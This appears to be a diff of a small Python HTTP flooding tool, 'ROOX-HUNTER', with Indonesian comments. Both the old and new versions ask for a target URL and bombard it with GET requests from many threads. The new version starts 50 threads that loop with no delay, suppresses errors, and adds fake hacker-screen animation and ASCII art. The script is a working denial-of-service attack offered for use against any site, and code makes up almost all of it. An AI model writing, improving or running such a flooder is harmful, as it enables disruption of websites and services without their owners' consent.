@@ -3,103 +3,59 @@ import threading
 import requests
 import time
 import random
-import sys
 
-# Konfigurasi
-THREADS = 5              # jumlah thread
-REQ_PER_THREAD = 10      # request per thread per detik (5 x 10 = 50 total)
+NAGA_ART = r"""
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣤⣶⣶⣶⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢿⣷⣦⣀⠀⠀⠀
+⠀⠀⠀⣠⣾⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣷⡄⠀
+⠀⠀⣼⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣷⠀⠀
+⠀⣼⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀
+⣸⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀
+⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⠀⠀
+⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀
+⢿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡿⠀⠀
+⠘⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠃⠀⠀
+⠀⠙⠻⣿⣿⣿⣷⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣾⣿⠋⠀⠀⠀
+⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⣷⣶⣦⣤⣤⣤⣤⣤⣤⣶⣶⣾⣿⣿⣿⣿⠿⠋⠀⠀⠀
+"""
 
-# Warna teks
-G = "\033[1;92m"
-R = "\033[1;91m"
-C = "\033[1;96m"
-Y = "\033[1;93m"
-END = "\033[0m"
+FAKE_CHARS = list("01abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
 
-# Global Counter
-total_sent = 0
-lock = threading.Lock()
-
-# Clear screen
-def clear():
-    os.system("cls" if os.name == "nt" else "clear")
-
-# Banner ROOX
-def banner():
-    clear()
-    print(G + r"""
-██╗ █████╗ ███╗  ██╗ ██████╗  ██████╗ ██╗  ██╗
-      ██║██╔══██╗████╗ ██║██╔════╝ ██╔═══██╗╚██╗██╔╝
-      ██║███████║██╔██╗██║██║  ███╗██║   ██║ ╚███╔╝ 
- ██   ██║██╔══██║██║╚████║██║   ██║██║   ██║ ██╔██╗ 
- ╚█████╔╝██║  ██║██║ ╚███║╚██████╔╝╚██████╔╝██╔╝ ██╗
-  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚══╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
-""" + END)
-    print(C + "[!] TOOL: ROOX-HUNTER | By ROOX" + END)
-    print()
-
-# Efek teks hijau ala hacker
-def hacker_animation():
-    chars = "0123456789ABCDEF"
-    for _ in range(15):
-        line = "".join(random.choice(chars) for _ in range(60))
-        print(G + line + END)
-        time.sleep(0.05)
-
-# Cek koneksi target
-def cek_target(url):
+# Animasi terminal hacker full layar
+def hacker_screen():
     try:
-        print(C + "[•] Mengecek target..." + END)
-        res = requests.get(url, timeout=5)
-        print(G + f"[✓] Target aktif: {res.status_code}" + END)
+        columns, _ = os.get_terminal_size()
     except:
-        print(R + "[x] Gagal mengakses target, lanjut uji brute..." + END)
-
-# Serangan permintaan HTTP
-def attack(url):
-    global total_sent
+        columns = 80
     while True:
-        for _ in range(REQ_PER_THREAD):
-            try:
-                requests.get(url, timeout=3)
-                with lock:
-                    total_sent += 1
-            except:
-                pass
-        time.sleep(1)
+        line = "".join(random.choice(FAKE_CHARS) for _ in range(columns))
+        print(f"\033[1;32m{line}\033[0m")
+        time.sleep(0.02)
 
-# Monitor + animasi
-def monitor():
+# Kirim request terus menerus
+def send_request(url):
     while True:
-        hacker_animation()
-        with lock:
-            print(C + f"[•] Total request terkirim: {total_sent}" + END)
-        time.sleep(1)
+        try:
+            requests.get(url, timeout=2)
+        except:
+            pass  # jangan tampilkan error
 
-# Main
+# Main function
 def main():
-    banner()
-    target = input(Y + "[?] Masukkan URL target (gunakan http/https): " + END)
-    if not target.startswith("http"):
-        target = "http://" + target
+    os.system('clear')
+    print(f"\033[1;31m{NAGA_ART}\033[0m")
+    print("\n\033[1;92mROOX HACKER NASA MODE ACTIVE...\033[0m")
+    url = input("\n\033[1;96mMasukkan URL Target (contoh: https://example.com): \033[0m")
 
-    cek_target(target)
+    # Jalankan animasi teks hacker
+    threading.Thread(target=hacker_screen, daemon=True).start()
 
-    print(C + "[•] Memulai serangan 50 request/detik..." + END)
-    time.sleep(1)
+    # Kirim 50 request per detik
+    for _ in range(50):
+        threading.Thread(target=send_request, args=(url,), daemon=True).start()
 
-    # Mulai thread serangan
-    for _ in range(THREADS):
-        t = threading.Thread(target=attack, args=(target,))
-        t.daemon = True
-        t.start()
-
-    # Thread monitor
-    monitor()
+    while True:
+        time.sleep(10)
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print(R + "\n[!] Dihentikan oleh user." + END)
-        sys.exit()
+    main()
